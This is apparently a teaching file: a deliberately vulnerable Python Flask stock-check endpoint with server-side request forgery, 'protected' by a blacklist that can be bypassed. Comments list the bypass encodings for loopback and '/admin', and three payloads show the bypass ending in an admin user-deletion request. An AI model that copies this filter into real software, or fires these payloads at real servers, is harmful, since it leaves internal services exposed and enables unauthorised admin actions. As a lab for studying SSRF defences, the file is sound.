"""
VULNERABLE CODE — SSRF with Blacklist-Based Input Filter
Language: Python (Flask)

WHAT THIS SIMULATES:
    A developer discovered their stock check endpoint was vulnerable to SSRF.
    Instead of fixing it properly (allowlist + DNS validation), they patched it
    with a blacklist. The blacklist is weak and bypassable in multiple ways.

TWO DEFENSES DEPLOYED (both broken):
    1. Block URLs containing "127.0.0.1" or "localhost"
    2. Block URLs with paths containing "/admin"
"""

from flask import Flask, request, jsonify, abort
import requests

app = Flask(__name__)


def is_blocked(url: str) -> bool:
    """
    Weak blacklist filter.
    Checks raw string values — no decoding, no normalization, no DNS resolution.
    This is the broken defense.
    """
    url_lower = url.lower()

    # ❌ DEFENSE 1 — Blocks literal strings only
    # Bypassed by: 2130706433, 127.1, 0x7f000001, 0177.0.0.1, [::1], localtest.me
    blocked_hosts = ["127.0.0.1", "localhost"]
    for blocked in blocked_hosts:
        if blocked in url_lower:
            return True

    # ❌ DEFENSE 2 — Blocks /admin in the raw undecoded URL
    # Bypassed by: /%2561dmin (double-encoded), /Admin, /./admin
    if "/admin" in url_lower:
        return True

    return False


@app.route("/product/stock", methods=["POST"])
def check_stock():
    stock_api_url = request.form.get("stockApi", "")

    # ❌ Filter checks raw input — does not decode or resolve first
    if is_blocked(stock_api_url):
        return jsonify({"error": "External stock check service is not available"}), 400

    # Server fetches the URL — decodes it during the HTTP request
    # /%2561dmin → /%61dmin → /admin  (decoded by the HTTP library)
    try:
        response = requests.get(stock_api_url, timeout=10)
        return jsonify({"stock": response.text}), response.status_code
    except requests.RequestException as e:
        return jsonify({"error": str(e)}), 500


# ============================================================
# HOW THE BYPASS WORKS AGAINST THIS CODE
#
# Attack 1 — Bypass hostname block:
#   stockApi=http://2130706433/
#   is_blocked() checks: "2130706433" in "127.0.0.1, localhost" → False → PASS
#   requests.get("http://2130706433/") → connects to 127.0.0.1 ← LOOPBACK
#
# Attack 2 — Bypass path block:
#   stockApi=http://2130706433/%2561dmin
#   is_blocked() checks: "/admin" in "/%2561dmin" → False → PASS
#   requests.get decodes: /%2561dmin → /%61dmin → /admin ← ADMIN PANEL
#
# Attack 3 — Delete carlos:
#   stockApi=http://2130706433/%2561dmin/delete?username=carlos
#   Both bypasses applied → server executes admin delete action
# ============================================================


if __name__ == "__main__":
    app.run(debug=True, port=5000)
